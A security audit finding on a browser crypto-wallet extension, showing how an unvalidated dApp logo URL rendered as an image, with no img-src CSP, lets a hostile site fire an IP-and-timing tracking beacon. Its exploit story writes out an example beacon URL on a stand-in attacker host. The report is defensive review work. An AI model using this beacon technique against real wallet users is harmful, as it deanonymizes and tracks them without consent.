CLUSTER: ext-components-design

## Findings

### [1] dApp-controlled logo URL rendered as `<img src>` with unrestricted `img-src` CSP → deanonymizing tracking beacon

1. **Title** — Unvalidated dApp `dappMetadata.logo` string is copied verbatim into an `<img :src>` on every dApp-interaction window; the extension CSP sets only `script-src`, leaving `img-src` unrestricted, so a malicious dApp fires an IP/timing beacon at popup render (before any user approval).

2. **Impact factors** — Confidentiality (privacy/deanonymization) of a non-custodial wallet user. Blast radius: any user who receives/opens a dApp interaction popup (connect / capabilities / execute / verify) from a hostile page. Data sensitivity: user's public IP, precise timestamp of wallet interaction, and an attacker-chosen correlation id — enough to link an "anonymous" wallet session to a browser/IP and confirm active wallet use. Exploitability: attack vector Network (AV:N); attack complexity Low (AC:L); privileges required None (PR:N — `connect` is callable by any web page, no prior grant); user interaction minimal (the interaction window is opened in response to the dApp's own request; the `<img>` loads on component mount, before the user clicks approve/reject). Not code execution — `javascript:`/`data:` in `<img src>` is inert — so this is an info-disclosure/privacy violation, not DOM XSS.

3. **Evidence confidence** — high. Source→sink is explicit and the composable comment documents that the mitigating gate was deliberately removed. The only residual uncertainty (CSP `img-src` fallback) resolves against the code: per CSP spec, with neither `img-src` nor `default-src` present, image loads are unrestricted, and MV3 does not inject a default `img-src` for extension pages.

4. **OWASP / CWE mapping** — OWASP A01:2021 (Broken Access Control / cross-boundary data exposure) and A05:2021 (Security Misconfiguration — missing `img-src`/`default-src`). CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor); related CWE-359 (privacy). Adjacent to CWE-1021 (improper restriction of rendered UI layers) via the missing CSP directive.

5. **Trace** —
   - Source (untrusted entry): `apps/extension/src/wallet/services/dapp-session/spec.ts:30` — `DappMetadata.logo?: string`, a plain string with no scheme/origin validation; populated from the dApp discovery/interaction payload (dApp-controlled).
   - One-hop origin (cluster 11): `apps/extension/src/composables/useDappInteractionPayload.ts:92` — `if (meta.logo) meta.logoBlobUrl = meta.logo` (verbatim copy; the docstring at lines 48-49 states "Copies `dapp.logo` to `dapp.logoBlobUrl` directly (post-#29 the privacy gate is gone)").
   - Sink (this cluster): `apps/extension/src/components/composite/DappIdentityBlock.vue:40` — `<img v-else-if="dapp?.logoBlobUrl" :src="dapp?.logoBlobUrl" ... />`.
   - Enabling misconfiguration: `apps/extension/manifest/manifest.config.ts:41-43` — `content_security_policy.extension_pages: "script-src 'self' 'wasm-unsafe-eval'"` — no `img-src`, no `default-src` → images load from any origin.

6. **Missing control** — (a) No scheme/origin allowlist on `logo` (a wallet should only render `data:` images it re-encodes, or a fixed set of hosts, or nothing). `sanitizeWireString` is applied to `dapp.name` (`DappIdentityBlock.vue:33`) but NOT to `logo`. (b) No CSP `img-src`/`default-src` directive to contain remote image fetches. The previously-existing "privacy gate" that fetched/re-encoded the logo locally was removed (#29).

7. **Exploit story** — (1) Attacker hosts `https://evil.example/b.gif?id=<random>` that logs `X-Forwarded-For` + timestamp and returns a 1×1 image. (2) A page the victim visits calls the wallet's `connect` (or any interaction that opens capabilities/execute/verify) with `dappMetadata.logo = "https://evil.example/b.gif?id=abc123"`. (3) The wallet opens the interaction window; `DappIdentityBlock` mounts and the browser fetches the logo URL from the extension-page context. (4) Attacker's server records the victim's public IP, exact time, and `id=abc123`, correlating the wallet user to an IP/browser and confirming active wallet use — before the user approves or rejects anything. Repeat across sites to track the user.

8. **Preconditions** — Victim's browser processes a dApp interaction request (connect is unauthenticated; any website qualifies) and the corresponding window renders. No prior session, grant, or click on the logo is required — mount-time `<img>` load suffices.

9. **Why mitigations fail** — The `name` sanitizer does not cover `logo`. Zod/typing on `DappMetadata` (`spec.ts`) types `logo` as `string` with no `.url()`/scheme refinement, so any absolute URL passes. Vue attribute-binding escaping prevents HTML injection but does nothing to stop a well-formed remote URL from being fetched. The MV3 CSP does restrict `script-src`, which blocks JS execution — but that is why the impact is a fetch/beacon, not XSS; nothing in the policy restricts `img-src`.

10. **Instances** — Sink in this cluster: `apps/extension/src/components/composite/DappIdentityBlock.vue:40`. Same root cause (dApp `logo` → `<img src>`) elsewhere: `apps/extension/src/popup/windows/verify/index.vue:199` (fed by `verify/index.vue:161`), `apps/extension/src/popup/pages/settings/connected-apps/index.vue:144` (fed by `:43`), `apps/extension/src/popup/pages/settings/connected-apps/[id].vue:202` (fed by `[id].vue:83`). Origin copy: `apps/extension/src/composables/useDappInteractionPayload.ts:92`. Missing control: `apps/extension/src/wallet/services/dapp-session/spec.ts:30`; `apps/extension/manifest/manifest.config.ts:41-43`.

## Notes

Checked and clean:

- **No raw-HTML sinks in production.** `grep` for `v-html` / `innerHTML` / `domProps*` across `apps/extension/src/components/**` and `packages/design/src/**` returns only the `packages/design/src/boundary.test.ts` tripwire test that asserts their absence. No component writes attacker data to an HTML sink.
- **JsonViewer** (`apps/extension/src/components/JsonViewer/JsonViewer.vue`) — renders `JSON.stringify(props.data)` as a CodeMirror `EditorState` doc. CodeMirror renders doc content as text nodes, not HTML, so chain/dApp-controlled JSON cannot break out. Fullscreen uses `chrome.runtime.getURL(...)` + `searchParams.set` (encoded). Clean.
- **LogsViewer** (`.../JsonViewer/LogsViewer.vue`, `logs-format.ts`, `logs-decoration.ts`) — log lines (which can embed dApp/chain strings) are `formatSingleLog`-stringified into a CodeMirror doc (text, not HTML). `logs-decoration.ts` uses only `Decoration.mark({ class: <fixed "log-line-*" literal> })` — a CSS class on a text range, no widget/HTML injection, and the class is not attacker-derived. Clean.
- **Untrusted-data renderers use safe `{{ }}` interpolation.** `AddressDisplay` (both `packages/design/src/composite/AddressDisplay.vue` and the flat `apps/extension/src/components/AddressDisplay.vue`), `ScopeAddress.vue`, `ScopeClassId.vue`, `CapabilityDetailPanel.vue` render addresses / capability scopes / method ids as escaped text; the extension copies additionally route dApp/contact strings through `sanitizeWireString`/`stripWireControl` (`apps/extension/src/wallet/services/dapp-session/capability-meta`). `:title`/`:aria-label`/`:data-scope-addr` are attribute bindings (Vue-escaped, non-URL, inert).
- **URL/`:href` sinks are static or router-resolved.** `apps/extension/src/components/ui/Settings/SettingItem.vue:47` (`:href="external ? to : null"`) is only ever fed hard-coded `https://nulo.sh/...` literals (e.g. `apps/extension/src/popup/pages/settings/about.vue`). `apps/extension/src/components/ui/Button.vue:38` binds `:href` to vue-router's resolved `href` (custom RouterLink slot), not raw input. Neither takes dApp/chain data.
- **`packages/design/src/ui/Toast.vue:22** (`:href="link.href"`, `target="_blank" rel="noopener noreferrer"`) has NO scheme validation on `link.href`, but it is not reachable with untrusted data in scope: the extension's toast path (`ToastManagerBase.vue` + `@nulo/design/composables/toast`) renders `{{ toast.label }}` only, and `ToastOptions` has no `href`/`link` field. The `link`-bearing `Toast.vue` primitive is consumed only by `apps/faucet` (out of scope). Flagged here as a **latent** design-primitive gap: if any future wallet caller passes a dApp/chain-derived `link.href`, a `javascript:` URL would execute on click — recommend a scheme allowlist (`https:`/`mailto:`) in the primitive.
- **Dynamic `:style` bindings** across the cluster (Popup z-index, SecretCountdownClose animation-duration, AccountAvatar/Popover sizes, Toggle background from a design-token color prop, Icon fill from static `icons.json`) are numeric/enum/token-derived — none interpolate dApp/chain strings, and CSS `url(javascript:...)` is browser-blocked regardless.
